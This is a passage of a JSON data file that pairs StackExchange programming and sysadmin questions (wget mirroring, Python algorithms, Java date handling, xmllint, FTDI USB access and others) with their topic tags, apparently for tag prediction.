for the passphrase only once when I start my rsync script so that I can switch hosts and rerun the script as in my example.",
    "target": "bash;shell script;ssh;rsync;prompt"
  },
  {
    "id": "_unix.9221",
    "source": "How to work around missing 'last-modified' headers? <eos> I'm running wget like this:wget --mirror --adjust-extension --convert-links --no-cookies http://tshepang.net -o log-mainI get a bunch of these messages:Last-modified header missing -- time-stamps turned off.I suppose that means that pages keep getting re-downloaded, even though I have them locally.NOTE: I want this so that I don't have to re-download existing files each time I run the command mirror.",
    "target": "wget;web"
  },
  {
    "id": "_codereview.144492",
    "source": "Find valid triples for a sorted list of integers (part 2) <eos> Have some ideas to improve code from this discussion (Find valid triples for a sorted list of integers), and post new code in a new post.The new idea is, trying to remember where low bound searched last time, and when doing the search, only search from the lower bound where last search is satisfied, since with j increase each time, the 3rd dimension of satisfied triple could only increase. More specifically, these two lines,    #upperBoundIndex = findSum(numbers, j+1, numbers[i]+numbers[j]) # previous code    upperBoundIndex = findSum(numbers, upperBoundIndex, numbers[i] + numbers[j]) I'm working on a problem in which I have an input array, sorted positive unique integers, and have to try to find all possible triples \\$(x,y,z)\\$ which satisfy \\$x+y>z\\$ and \\$x<y<z\\$. For example, \\$(1,2,3)\\$ is not a valid triple since \\$1+2\\$ is not \\$> 3\\$, and \\$(3,4,5)\\$ is a valid triple since \\$3<4<5\\$ and \\$3+4>5\\$.This code leverages binary search, and I'm wondering if this can be improved in terms of time complexity. Please also help to point out any code issues/bugs or improvement areas.BTW, I am not using enumeration feature of Python since I want to keep j greater than i, and leverage the feature in my logics.from __future__ import divisiondef findSum(numbers, startIndex, value):        find index whose value is less than input parameter value (as upper bound)    ,and the greatest possible value possible    :param numbers: sorted value to search, may contains duplicates    :param startIndex: where to search from, inclusive    :param value: upper bound to search    :return: the index whose value is less than upper bound value        low = startIndex    high = len(numbers) - 1    while low <= high:        mid = (low + high) // 2        if numbers[mid] == value:            while mid >= low and numbers[mid] == value:                mid -= 1            return mid if mid >= low else -1        elif numbers[mid] > value:            high = mid - 1        else:            low = mid + 1    # while    return low-1 if (low-1) >= startIndex else -1def findTriagles(numbers):        :param numbers: could contains duplicate number, assume numbers are sorted    :return: unique triples        results = set()    for i in range(0, len(numbers)-2):        upperBoundIndex=min(i+2, len(numbers)-1)        for j in range(i+1, len(numbers)-1):            #upperBoundIndex = findSum(numbers, j+1, numbers[i]+numbers[j]) # previous code            upperBoundIndex = findSum(numbers, upperBoundIndex, numbers[i] + numbers[j])            if upperBoundIndex != -1:                for k in range(j+1, upperBoundIndex+1):                    results.add((numbers[i],numbers[j],numbers[k]))    return resultsif __name__ == __main__:    #print findTriagles([4,5,6,7]) # output, set([(4, 6, 7), (4, 5, 7), (4, 5, 6), (5, 6, 7)])    print findTriagles([4, 4, 6, 7]) # output, set([(4, 4, 6), (4, 4, 7), (4, 6, 7)])",
    "target": "python;algorithm;python 2.7;sorting;binary search"
  },
  {
    "id": "_unix.21378",
    "source": "Non printing characters <eos> I would love to get the mappings to work for keyboard shortcuts shown here http://ascii-table.com/ansi-escape-sequences.php  I have the hang of color but for some reason nothing else seems to work!",
    "target": "bash;terminal"
  },
  {
    "id": "_codereview.135259",
    "source": "Java util to compare if time beyond cutoff <eos> I have a to write a simple utility function that given a time in CST and a date in PST, tells if the date is today and if the current time is less than the cutoff (post converting cutoff to PST).This is my attempt (highly childish but I seriously don't get Java date-time at all). If anyone could help me improve this code, I would be highly grateful.  /**   * Returns true if:   *   - availableDate is today    *   - currentTime is less than cutoff time   * False otherwise   *    * @param cutoffTimeStr HH:mm format, CST timezone   * @param availableDate YYYYMMDD format, PST timezone   * @return true/false   */  public Boolean test(String cutoffTimeStr, String availableDate) throws ParseException{    DateFormat availableDateFormat = new SimpleDateFormat(YYYYMMDD, Locale.ENGLISH);    Date avlDate = availableDateFormat.parse(availableDate);    avlDate.setHours(new Date().getHours());    avlDate.setMinutes(new Date().getMinutes());    //Compose current time with the given date    DateFormat cutOffFormat = new SimpleDateFormat(HH:mm);    cutOffFormat.setTimeZone(TimeZone.getTimeZone(CST));    Time cutOffTime = new java.sql.Time(cutOffFormat.parse(cutoffTimeStr).getTime());    //cutOffTime is PST version of given CST time    Date currentDateWithCutoffTime = new Date();    currentDateWithCutoffTime.setHours(cutOffTime.getHours());    currentDateWithCutoffTime.setMinutes(cutOffTime.getMinutes());    //Today's date with time as cutoff    if(avlDate.before(currentDateWithCutoffTime)){      return true;    } else{      return false;    }  }I have assumed that the availableDate will always be today or greater than today and thus, if its before the currentDateWithCutoffTime, we can return true.",
    "target": "java;datetime"
  },
  {
    "id": "_cs.44816",
    "source": "Shaefer's Dichotomy Theorem <eos> Could you please resolve a confusion with Schaefer's theorem for me? Namely, why does it not imply many problems in P are NP-complete? For example, primality testing surely cannot be reduced to one of the six classes in the theorem, so why does that not imply it's NP-complete?",
    "target": "complexity theory;np complete;satisfiability"
  },
  {
    "id": "_softwareengineering.87460",
    "source": "Deciphering foreign code <eos> What is the best strategy to go about understanding some one else's code for a medium sized project, if the code is not well documented and does not adhere to many coding standards?",
    "target": "maintenance;comments;knowledge transfer"
  },
  {
    "id": "_cstheory.10362",
    "source": "What is the significance of abstract linear algebra in machine learning/computer vision research? <eos> I am a computer science research student working in application of Machine Learning to solve Computer Vision problems.Since, lot of linear algebra(eigen-values, SVD etc.) comes up when reading Machine Learning/Vision literature, I decided to take a linear algebra course this semester. Much to my surprise, the course didn't look at all like Gilbert Strang's Applied Linear algebra(on OCW) I had started taking earlier. The course textbook is Linear Algebra by Hoffman and Kunze. We started with concepts of Abstract algebra like groups, fields, rings, isomorphism, quotient groups etc. And then moved on to study theoretical linear algebra over finite fields, where we cover proofs for important theorms/lemmas in the following topics:Vector spaces, linear span, linear independence, existence of basis.  Linear transformations. Solutions of linear equations, row reduced  echelon form, complete echelon form,rank. Minimal polynomial of a  linear transformation. Jordan canonical form. Determinants.  Characteristic polynomial, eigenvalues and eigenvectors. Inner product  space. Gram Schmidt orthoganalization. Unitary and Hermitian  transformations. Diagonalization of Hermitian transformations.I wanted to understand if there is any significance/application of understanding these proofs in machine learning/computer vision research or should I be better off focusing on the applied Linear Algebra?",
    "target": "machine learning;linear algebra;cv.computer vision"
  },
  {
    "id": "_unix.28853",
    "source": "Changing background color of gedit's whitespace highlighting <eos> I've used NEdit since about 2003. NEdit's whitespace highlighting is subtle and I prefer it to the dot other editors put in whitespace. NEdit's background normally is light grey and whitespace is rendered as white without a dot (and tabs in a darker gray).However, NEdit doesn't support UTF-8 encoding, so I don't intend to use NEdit for much longer. I've (reluctantly) determined that gedit is the presently available editor that is closest to what I want.I am trying to replicate NEdit's look in gedit without success. I can change the style of the spaces shown with the Draw Spaces plugin by adding the following to the gedit style file:<style name=draw-spaces foreground=color/>The foreground property only changes the color of the dot. There does not appear to be a corresponding background property to change the background. I thought if I made foreground and background the same color then I could replicate NEdit's look.How can I change the background color of the whitespace highlighting in gedit without also changing the background color of the remainder of the text?",
    "target": "gedit"
  },
  {
    "id": "_cstheory.27104",
    "source": "Is the bitonic sort algorithm stable? <eos> I was wondering, is the bitonic sort algorithm stable? I searched the original paper, wikipedia and some tutorials, could not find it.It seems to me that it should be, as it is composed of merge / sort steps, however was unable to find answer anywhere.The reason why I'm asking - I was comparing this particular implementation of bitonic sort to the sort implemented in the C++ standard library, for array length 9 it requires 28 comparison / swap operations, while the standard library sort (which is unstable) requires 25. The three extra cswaps do not seem enough to make the sort stable.",
    "target": "sorting;sorting network;stable"
  },
  {
    "id": "_unix.235489",
    "source": ". /path/to/a/shell-script-file ? (within a shell script) <eos> What does . /path/to/a/shell-script-filedo exactly? I mean obviously it executes that shell script but why put that . followed by a space before the path/name of the script file?",
    "target": "bash;shell"
  },
  {
    "id": "_webapps.51728",
    "source": "How can I fix a WiseStamp signature who disappears from Yahoo mail? <eos> I have one problem to bring to your kind attention and I hope that you'll know the answer and thus help me. Well, it is about WiseStamp, I have been used it in the past, so I am quite familiar to it. Only that I have been using it intermittently. I remember that it used to work excellent on all of my email accounts be it Yahoo or Google.But now I have installed it is again on all of my browsers, and although it seem to work fine in Gmail, it has a problem with Yahoo - the WiseStamp signature doesn't appear at all and I can't insert it either. I must say that, when I sign into my WiseStamp account and I edit my signature, I do can see it, but only in my preview signature. Otherwise, I can only see it in my Gmail, as I have already told. I have to mention that, in order to solve this situation, I have followed the advices from the official site. But, unfortunately, those advices did not helped much. Practically, they ask me to reinstall the add-on. I did that three times, but with no result. I did a Google search over it but it seem that I have no luck in it. All I could find was an article apparently suggesting that the new changes of Yahoo mail can affect some codes, or something like that. and it occurred to me that this might be the cause of the unusual behaviour of the add-on.Even so, this must have a solution, and if you know how to fix this and make the WiseStamp signature reappear in Yahoo mail, please, tell me!Thank you in advance for your help!",
    "target": "yahoo mail;email signature"
  },
  {
    "id": "_codereview.123571",
    "source": "REST API calls to BIG-IP LTM to get the status of pool members <eos> This code calls the iControl REST API provided by BIG-IP LTM. Trying to get the list of the pools, it's current status and the pool members associated with the pool.My code works like this, based on three calls:Get the pool names (/mgmt/tm/ltm/pool)Based on the pool names (path), get its status (mgmt/tm/ltm/pool/~pool~name/stats)Based on the pool names (path), get its pool members (/mgmt/tm/ltm/pool/~pool~names/members)If I do only the first call, I get the output within milliseconds. After adding the second call, it becomes worse. With a third call, it takes good amount of time (more than 6 minutes) to get all the output for about 400 pools.How can I optimize this code?import requestsfrom requests.auth import HTTPBasicAuthBASE_URL = https://localhost/mgmt/tmusername = adminpassword = admindef makeRequest(username, password, url):    response_data = requests.get(url, auth = HTTPBasicAuth(username, password), verify = False)    return response_data.json()pool_data = makeRequest(username, password, BASE_URL + /ltm/pool)for pools in pool_data['items']:    print pools['name']    tildPath = pools['fullPath'].replace('/','~')    #GET the Pool stats    pool_stats = makeRequest(username, password, BASE_URL + /ltm/pool/ + tildPath + /stats)    print pool_stats['entries']['status.availabilityState']['description']    #GET the Pool Members    pool_members = makeRequest(username, password, BASE_URL + /ltm/pool/ + tildPath + /members)    for members in pool_members['items']:        print members['name'] +  + members['address'] +   + members['state']",
    "target": "python;performance;rest;status monitoring"
  },
  {
    "id": "_codereview.95262",
    "source": "Parsing JSON string from HTTP request <eos> HTTP request is made, and a JSON string is returned, which needs to be parsed.Example response:{urlkey: com,practicingruby)/, timestamp: 20150420004437, status: 200, url: https://practicingruby.com/, filename: common-crawl/crawl-data/CC-MAIN-2015-18/segments/1429246644200.21/warc/CC-MAIN-20150417045724-00242-ip-10-235-10-82.ec2.internal.warc.gz, length: 9219, mime: text/html, offset: 986953615, digest: DOGJXRGCHRUNDTKKJMLYW2UY2BSWCSHX}{urlkey: com,practicingruby)/, timestamp: 20150425001851, status: 200, url: https://practicingruby.com/, filename: common-crawl/crawl-data/CC-MAIN-2015-18/segments/1429246645538.5/warc/CC-MAIN-20150417045725-00242-ip-10-235-10-82.ec2.internal.warc.gz, length: 9218, mime: text/html, offset: 935932558, digest: LJKP47MYZ2KEEAYWZ4HICSVIHDG7CARQ}{urlkey: com,practicingruby)/articles/ant-colony-simulation?u=5c7a967f21, timestamp: 20150421081357, status: 200, url: https://practicingruby.com/articles/ant-colony-simulation?u=5c7a967f21, filename: common-crawl/crawl-data/CC-MAIN-2015-18/segments/1429246641054.14/warc/CC-MAIN-20150417045721-00029-ip-10-235-10-82.ec2.internal.warc.gz, length: 10013, mime: text/html, offset: 966385301, digest: AWIR7EJQJCGJYUBWCQBC5UFHCJ2ZNWPQ}My code:result = Net::HTTP.get(URI(http://index.commoncrawl.org/CC-MAIN-2015-18-index?url=#{url}&output=json)).split(})result.each do |res|    break if res == \\n    #need to add back braces because we used it to split the various json hashes from the http request    res << }    to_crawl = JSON.parse(res)    puts to_crawlendIt works, but I'm sure there is a much better way to do it, or at least a better way to write the code.",
    "target": "ruby;json;http"
  },
  {
    "id": "_cs.77390",
    "source": "Data Analysis: Have 70 data parameters, how many different classes of 3 are possible? <eos> The order of the classes of three does not matter. Example: 1,2,3 and 3,2,1 would be considered one class. I am trying to do fisher discriminant analysis on a set of data and want to begin reducing the parameters to better help with classification. As of now I cannot tell which parameters are the most pertinent, so looping every combination through and then having MATLAB take out the LDA analysis with the MisIDs on the lower end in my algorithm will help to isolate the parameters. Can someone refresh me on the math behind this/suggest a way to code this in MATLAB?",
    "target": "combinatorics"
  },
  {
    "id": "_unix.122992",
    "source": "How to mark not fully installed apt-get package as successfully installed <eos> I have installed Debian 7.4 on my Iomega ix2-200 NAS, following this blog. The ix2-200 is running an ARM Marvel CPU and has a 128 MB NAND flash memory. The flash contains an initramfs image (uInitrd) and a kernel image (uImage) to boot the system.Sometimes, a new package (like cryptsetup) requieres to update the kernel and fails (Unsupported platform). I manually need to flash the new initramfs initrd.img-3.2.0-4-kirkwood and kernel vmlinuz via mkimage, which works fine.The (anoying) issue: everytime I run apt-get upgrade the system is showing up those unfinished packages. How can I tell my system that everything is fine?I have tried Google and StackExchange, but most of the posts are dealing with how to remove those unfinished/incomplete packages. I want to keep it!Please see attached code snapshot:#> apt-get install cryptsetupReading package lists... DoneBuilding dependency treeReading state information... DoneThe following extra packages will be installed:  console-setup console-setup-linux cryptsetup-bin kbd keyboard-configuration libcryptsetup4 xkb-dataSuggested packages:  dosfstoolsThe following NEW packages will be installed:  console-setup console-setup-linux cryptsetup cryptsetup-bin kbd keyboard-configuration libcryptsetup4 xkb-data0 upgraded, 8 newly installed, 0 to remove and 0 not upgraded.Need to get 3,179 kB of archives.After this operation, 11.8 MB of additional disk space will be used.Do you want to continue [Y/n]? y...Processing triggers for initramfs-tools ...update-initramfs: Generating /boot/initrd.img-3.2.0-4-kirkwoodUnsupported platform.run-parts: /etc/initramfs/post-update.d//flash-kernel exited with return code 1dpkg: error processing initramfs-tools (--configure): subprocess installed post-installation script returned error exit status 1Errors were encountered while processing: initramfs-toolsE: Sub-process /usr/bin/dpkg returned an error code (1)#> apt-get upgradeReading package lists... DoneBuilding dependency treeReading state information... Done0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.1 not fully installed or removed.After this operation, 0 B of additional disk space will be used.Do you want to continue [Y/n]?",
    "target": "debian;apt;initramfs"
  },
  {
    "id": "_unix.92158",
    "source": "Get Node value from a XML using xmllint <eos> I have a xml called Det.xml like this :<?xml version=1.0 encoding=UTF-8?>    <S:Envelope xmlns:S=http://schemas.xmlsoap.org/soap/envelope/>        <S:Body>            <ns4:grtHgetRed xmlns:ns2=http://object xmlns:ns3=http://object xmlns:ns4=http://object>                <RequestId>lol</RequestId>                <MessageDateTime>54.009</MessageDateTime>                <SenderId>UH</SenderId>                <ReceiverId>GER</ReceiverId>                <TrackingNumber>45</TrackingNumber>                <ServerName>trewds</ServerName>                <ResponseType>success</ResponseType>                <StatusInfo>                <Status>success</Status>                <SystemMessage>Hagert</SystemMessage>                <UserMessage>Hgert</UserMessage>                <Origination>htref</Origination>                </StatusInfo>            </ns4:grtHgetRed>        </S:Body>    </S:Envelope>I am trying to get the ResponseType node value success from it using xmllint in Unix shell script and so i tried the following :echo cat //*[local-name()='S:Envelope'/*[local-name()='S:Body']/*[local-name()='ns4:grtHgetRed']/*[local-name()='ResponseType'] | xmllint --shell Det.xml | sed '/^\\/ >/d' | sed 's/<[^>]*.//g'But it's not working . Also i don't  have xpath in my unix environment . Can any one tell me what am i doing wrong here ?I also tried using statusMSG==$(echo cat /Envelope/Body/grtHgetRed/ResponseType/text() | xmllint --nocdata --shell response.xml | sed '1d;$d'), then echo $statusMSG, but this gives an empty echo. Is this  because of namespace problem ?",
    "target": "xmllint"
  },
  {
    "id": "_webmaster.64791",
    "source": "Can I benefit from links to pages on my site which have a `noindex` meta tag? <eos> I'm trying to understand if/how I can benefit from people linking to pages on my site which are with pages that have a noindex meta tag. 2 actions I'm considering to perform:Remove the robots.txt disallow to these pages, to make sure inner links get the propagated link juice.Adding a canonical tag to the most similar page that doesn't have a noindex meta tagAre these valid approaches that might help? Any others I should consider?",
    "target": "seo;canonical url;noindex"
  },
  {
    "id": "_webapps.82378",
    "source": "How to perform a Vlookup with search column dynamic depending on input in another cell <eos> I have the following table.What I want to do is as follows.User selects either Minor, Medium, or Major and that specifies which column is used. User then inputs a number 1-100 and the chart then looks to find where the value follows and returns the text in the far right column.So if the user selects Minor and inputs 9 it would return Weapons but if they selected Medium and input 9 it would return Armor and Shields.I thought of one way to do this would be nested if statements with a unique VLookup in each(Example below) but I would prefer a much cleaner way to right this but I can't think of anyway.If (A1=Minor,Vlookup(A2, B2:E11,4),if(A2=Medium,Vlookup(A2, C2:E11,3)ECT...)",
    "target": "google spreadsheets"
  },
  {
    "id": "_codereview.77610",
    "source": "Reusable Unit Of Work Interface / Factory <eos> Given my IUnitOfWork interface    using System;public interface IUnitOfWork : IDisposable{    void Commit();}I then create an abstract factory interface called IUnitOfWorkFactoryusing System.Transactions;public interface IUnitOfWorkFactory{    IUnitOfWork GetUnitOfWork(IsolationLevel isolationLevel);}I then create a default implementation of my IUnitOfWork called TransactionScopeUnitOfWorkusing System;using System.Transactions;public class TransactionScopeUnitOfWork : IUnitOfWork{    private bool disposed = false;    private readonly TransactionScope transactionScope;    public TransactionScopeUnitOfWork(IsolationLevel isolationLevel)    {        this.transactionScope = new TransactionScope(                TransactionScopeOption.Required,                new TransactionOptions                {                    IsolationLevel = isolationLevel,                    Timeout = TransactionManager.MaximumTimeout                });    }    public void Dispose()    {        this.Dispose(true);        GC.SuppressFinalize(this);    }    protected virtual void Dispose(bool disposing)    {        if (!disposed)        {            if (disposing)            {                this.transactionScope.Dispose();            }            disposed = true;        }    }    public void Commit()    {        this.transactionScope.Complete();    }}I then create the factory to return that implementation called TransactionScopeUnitOfWorkFactoryusing System.Transactions;public class TransactionScopeUnitOfWorkFactory : IUnitOfWorkFactory{    public IUnitOfWork GetUnitOfWork(IsolationLevel isolationLevel)    {        return new TransactionScopeUnitOfWork(isolationLevel);    }}The reason for creating the factory is to allow DI (Dependency Injection) frameworks to use different unit of work implementations depending on configuration.If TransactionScopeUnitOfWorkFactory was mapped to IUnitOfWorkFactory in a DI container, some sample code for using it in an application could be:public class Test{    private readonly IUnitOfWorkFactory unitOfWorkFactory;    private readonly IRepository testRepository;    public Test(        IRepository testRepository,        IUnitOfWorkFactory unitOfWorkFactory)    {         this.testRepository = testRepository;         this.unitOfWorkFactory = unitOfWorkFactory;         using (IUnitOfWork unitOfWork = this.unitOfWorkFactory.GetUnitOfWork(IsolationLevel.Serializable))        {            this.testRepository.Delete(1); // Some valid CRUD            unitOfWork.Commit();        }    }I am asking if this seems like a good implementation.  Am I missing anything?I want an IUnitOfWork interface that I can use across applications and not worry about maintaining later on.  Any opinions?",
    "target": "c#;design patterns;.net;repository"
  },
  {
    "id": "_codereview.80439",
    "source": "Initializing object by settings implemented as a class <eos> Here is the story.We have the BankTerminalSettings class. It has many properties:public class BankTerminalSettings {    public bool IsEnabled { get; set; }    public string IPAddress {get; set;}    public ushort TcpPort {get; set; }    public List<string> Zombies {get; set;}    //and many other properties}And we have a class which takes BankTerminalSettings as a parameter of it's constructor.public class BankTerminal {    public BankTerminal(BankTerminalSettings terminal, int clientId) {        ValidateBankTerminalSettings(terminal);        terminalSettings = terminal;        this.clientId = clientId;    }}The thing is that the BankTerminal uses only three of all those properties in that domain config class named BankTerminalSettings.It's a temptation just to pass the whole instace of the BankTerminalSettings, but the caller can incidentally change those properties which are relevant for the BankTerminal. That can cause very subtle bugs.What would you recommend?To replicate the BankTerminalSettings before passing it's instance?To replicate the BankTerminalSettings in the constructor of the BankTerminal?To pass only those parameters which are truely needed by the BankTerminal?",
    "target": "c#;.net;constructor"
  },
  {
    "id": "_unix.305013",
    "source": "Accessing a USB device under Non - Privilaged user with FTDI2XX Driver <eos> I am trying access a USB device using libFtd2xx (Version : libftd2xx.so.1.3.6)driver. Driver Link : http://www.ftdichip.com/Drivers/D2XX/Linux/ReadMe-linux.txt ...To test device functionality used Simple from example directory and mentioned below are the output during execution.Under ROOTvenkat:/opt# ./simple-dynamicDevice 0 Serial Number - 12Z9UXGVDevice 1 Serial Number -Opened device 12Z9UXGVUnder NON_Privilaged Uservenkat@venkat:/opt$ ./simple-dynamicError: FT_ListDevices(2)Under ROOT User : Device accessing worked as expected. However, when tried executing it under normal user the device was not accessible.I believe it is somewhere related to some permission . But not able to get through this.Strace Diff ROOT  open(/dev/bus/usb/001/005, O_RDWR)    = 10Normal user  open(/dev/bus/usb/001/005, O_RDWR)    = -1 EACCES (Permission denied)Thing I made sure before running this application:    1. rmmod ftdi_sio (as super user)    2. chmod 0755 /usr/local/lib/libftd2xx.so.1.3.6    3. ln -sf /usr/local/lib/libftd2xx.so.1.3.6 /usr/local/lib/libftd2xx.soTried adding permission to UDEV too:ACTION==add, SUBSYSTEMS==usb, ATTRS{idVendor}==0403, ATTRS{idProduct}==6014, MODE=0755Request some guidance in addressing this issue.Source Sample:/*    Simple example to open a maximum of 4 devices - write some data then read it back.    Shows one method of using list devices also.    Assumes the devices have a loopback connector on them and they also have a serial number*//*To build use the following gcc statement (assuming you have the d2xx library in the /usr/local/lib directory).gcc -o simple main.c -L. -lftd2xx -Wl,-rpath /usr/local/lib*/#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unistd.h>#include ../ftd2xx.h#define BUF_SIZE 0x10#define MAX_DEVICES     5static void dumpBuffer(unsigned char *buffer, int elements){    int j;    printf( [);    for (j = 0; j < elements; j++)    {        if (j > 0)            printf(, );        printf(0x%02X, (unsigned int)buffer[j]);    }    printf(]\\n);}int main(){    unsigned char   cBufWrite[BUF_SIZE];    unsigned char * pcBufRead = NULL;    char *  pcBufLD[MAX_DEVICES + 1];    char    cBufLD[MAX_DEVICES][64];    DWORD   dwRxSize = 0;    DWORD   dwBytesWritten, dwBytesRead;    FT_STATUS   ftStatus;    FT_HANDLE   ftHandle[MAX_DEVICES];    int iNumDevs = 0;    int i, j;    int iDevicesOpen;       for(i = 0; i < MAX_DEVICES; i++) {        pcBufLD[i] = cBufLD[i];    }    pcBufLD[MAX_DEVICES] = NULL;    ftStatus = FT_ListDevices(pcBufLD, &iNumDevs, FT_LIST_ALL | FT_OPEN_BY_SERIAL_NUMBER);    if(ftStatus != FT_OK) {        printf(Error: FT_ListDevices(%d)\\n, (int)ftStatus);        return 1;    }    for(i = 0; ( (i <MAX_DEVICES) && (i < iNumDevs) ); i++) {        printf(Device %d Serial Number - %s\\n, i, cBufLD[i]);    }    for(j = 0; j < BUF_SIZE; j++) {        cBufWrite[j] = j;    }    for(i = 0; ( (i <MAX_DEVICES) && (i < iNumDevs) ) ; i++) {        /* Setup */        if((ftStatus = FT_OpenEx(cBufLD[i], FT_OPEN_BY_SERIAL_NUMBER, &ftHandle[i])) != FT_OK){            /*                 This can fail if the ftdi_sio driver is loaded                use lsmod to check this and rmmod ftdi_sio to remove                also rmmod usbserial            */            printf(Error FT_OpenEx(%d), device %d\\n, (int)ftStatus, i);            printf(Use lsmod to check if ftdi_sio (and usbserial) are present.\\n);            printf(If so, unload them using rmmod, as they conflict with ftd2xx.\\n);            return 1;        }        printf(Opened device %s\\n, cBufLD[i]);        iDevicesOpen++;        if((ftStatus = FT_SetBaudRate(ftHandle[i], 9600)) != FT_OK) {            printf(Error FT_SetBaudRate(%d), cBufLD[i] = %s\\n, (int)ftStatus, cBufLD[i]);            break;        }        printf(Calling FT_Write with this write-buffer:\\n);        dumpBuffer(cBufWrite, BUF_SIZE);        /* Write */        ftStatus = FT_Write(ftHandle[i], cBufWrite, BUF_SIZE, &dwBytesWritten);        if (ftStatus != FT_OK) {            printf(Error FT_Write(%d)\\n, (int)ftStatus);            break;        }        if (dwBytesWritten != (DWORD)BUF_SIZE) {            printf(FT_Write only wrote %d (of %d) bytes\\n,                    (int)dwBytesWritten,                    BUF_SIZE);            break;        }        sleep(1);        /* Read */        dwRxSize = 0;                   while ((dwRxSize < BUF_SIZE) && (ftStatus == FT_OK)) {            ftStatus = FT_GetQueueStatus(ftHandle[i], &dwRxSize);        }        if(ftStatus == FT_OK) {            pcBufRead = realloc(pcBufRead, dwRxSize);            memset(pcBufRead, 0xFF, dwRxSize);            printf(Calling FT_Read with this read-buffer:\\n);            dumpBuffer(pcBufRead, dwRxSize);            ftStatus = FT_Read(ftHandle[i], pcBufRead, dwRxSize, &dwBytesRead);            if (ftStatus != FT_OK) {                printf(Error FT_Read(%d)\\n, (int)ftStatus);                break;            }            if (dwBytesRead != dwRxSize) {                printf(FT_Read only read %d (of %d) bytes\\n,                       (int)dwBytesRead,                       (int)dwRxSize);                break;            }            printf(FT_Read read %d bytes.  Read-buffer is now:\\n,                   (int)dwBytesRead);            dumpBuffer(pcBufRead, (int)dwBytesRead);            if (0 != memcmp(cBufWrite, pcBufRead, BUF_SIZE)) {                printf(Error: read-buffer does not match write-buffer.\\n);                break;            }            printf(%s test passed.\\n, cBufLD[i]);        }        else {            printf(Error FT_GetQueueStatus(%d)\\n, (int)ftStatus);         }    }    iDevicesOpen = i;    /* Cleanup */    for(i = 0; i < iDevicesOpen; i++) {        FT_Close(ftHandle[i]);        printf(Closed device %s\\n, cBufLD[i]);    }    if(pcBufRead)        free(pcBufRead);    return 0;}",
    "target": "linux;debian;drivers;usb;devices"
  },
  {
    "id": "_webapps.30971",
    "source": "Convert friends to subscribers in Facebook <eos> Is there a way to convert your Facebook friends to subscribers? I have read that some people did it, but I can't find any info about it.",
    "target": "facebook"
  },
  {
    "id": "_webapps.105037",
    "source": "Remove access for unknown devices in account activity <eos> Why can't I remove a device off my Google account activity that is not one of my devices?",
    "target": "google account;security;account management"
  },
  {
    "id": "_cs.53450",
    "source": "Determine if there are 2 integers in 2 separate arrays add up to a given number <eos> If I'm given 2 unsorted arrays A and B of n distinct integers and an integer z, how can I determine if there exists an integer in A and an integer in B that add up to z with an expected run time of O(n)? I'm pretty sure that I would have to use a hash table(s) of some sort since I'm dealing with expected run time but I'm not sure how the algorithm would work.Any help would be really appreciated! Thanks!",
    "target": "algorithms;hash tables"
  },
  {
    "id": "_unix.385781",
    "source": "Mouse and keyboard don't work when used at the same time <eos> I am running the i3 window manager with Debian 9 Stretch on a laptop with a trackpad.I have run into the problem that whenever I type, the mouse is disabled. Is this normal behavior or a bug?nonfree repos have been enabled and linux-firmware-nonfree has been installed. The bug does not show up on other distributions.This does not happen with a USB mousexinput outputVirtual core pointer                        id=2    [master pointer  (3)]Virtual core XTEST pointer                  id=4    [slave  pointer  (2)]ETPS/2 Elantech Touchpad                    id=11   [slave  pointer  (2)]Virtual core keyboard                       id=3    [master keyboard (2)]Virtual core XTEST keyboard                 id=5    [slave  keyboard (3)]Video Bus                                   id=7    [slave  keyboard (3)]Power Button                                id=8    [slave  keyboard (3)]HP TrueVision HD                            id=9    [slave  keyboard (3)]AT Translated Set 2 keyboard                id=10   [slave  keyboard (3)]HP Wireless hotkeys                         id=12   [slave  keyboard (3)]HP WMI hotkeys                              id=13   [slave  keyboard (3)]Power Button                                id=6    [slave  keyboard (3)]Touchpad PropertiesDevice 'ETPS/2 Elantech Touchpad':    Device Enabled (142):   1    Coordinate Transformation Matrix (144): 1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000    libinput Tapping Enabled (277): 0    libinput Tapping Enabled Default (278): 0    libinput Tapping Drag Enabled (279):    1    libinput Tapping Drag Enabled Default (280):    1    libinput Tapping Drag Lock Enabled (281):   0    libinput Tapping Drag Lock Enabled Default (282):   0    libinput Tapping Button Mapping Enabled (283):  1, 0    libinput Tapping Button Mapping Default (284):  1, 0    libinput Accel Speed (285): 0.000000    libinput Accel Speed Default (286): 0.000000    libinput Natural Scrolling Enabled (287):   0    libinput Natural Scrolling Enabled Default (288):   0    libinput Send Events Modes Available (262): 1, 1    libinput Send Events Mode Enabled (263):    0, 0    libinput Send Events Mode Enabled Default (264):    0, 0    libinput Left Handed Enabled (289): 0    libinput Left Handed Enabled Default (290): 0    libinput Scroll Methods Available (291):    1, 1, 0    libinput Scroll Method Enabled (292):   1, 0, 0    libinput Scroll Method Enabled Default (293):   1, 0, 0    libinput Disable While Typing Enabled (294):    1    libinput Disable While Typing Enabled Default (295):    1    Device Node (265):  /dev/input/event1    Device Product ID (266):    2, 14    libinput Drag Lock Buttons (296):   <no items>    libinput Horizontal Scroll Enabled (297):   1",
    "target": "debian;i3;laptop"
  },
  {
    "id": "_unix.38498",
    "source": "Debian and system clock change? <eos> If I change my system time on Debian which files would be modified?Would it be /etc/default/rcS?Also, is default time on Debian Dec 31 1969?",
    "target": "linux;debian;time"
  },
  {
    "id": "_softwareengineering.351465",
    "source": "Does a file system see the storage device as a (very large) byte array? <eos> I want to know how does a file system write to and read from a storage device.I think this is how it works:A file system doesn't access the storage device directly, but rather the storage device is presented (by the device driver of the storage device) to the file system as a (very large) byte array.For example, if the file system wants to access a hard disk, it will simply access the byte array representing the hard disk.This way a file system can work with any type of storage device (traditional hard disk, SSD, USB flash drive, etc.), and only the device driver for the storage device is changed.This image shows what I have just explained:Am I correct in my understanding?",
    "target": "operating systems;file systems"
  },
  {
    "id": "_computergraphics.4272",
    "source": "Mapping of cylinder to 2D plane <eos> I have a cylinder that has rectangular box regions to mark leakage problems. The location of a rectangular box is determined by its initial position in the longitudinal axis and its initial position in the circumferential axis in degree. The length  and width (in degrees, from 0 to 360) of the boxes are also available.How can I convert this cylinder to a plane surface so that I can find the location of the rectangular boxes in the 2D plane?Here I have  three rectangles on the surface.",
    "target": "computational geometry"
  },
  {
    "id": "_softwareengineering.312468",
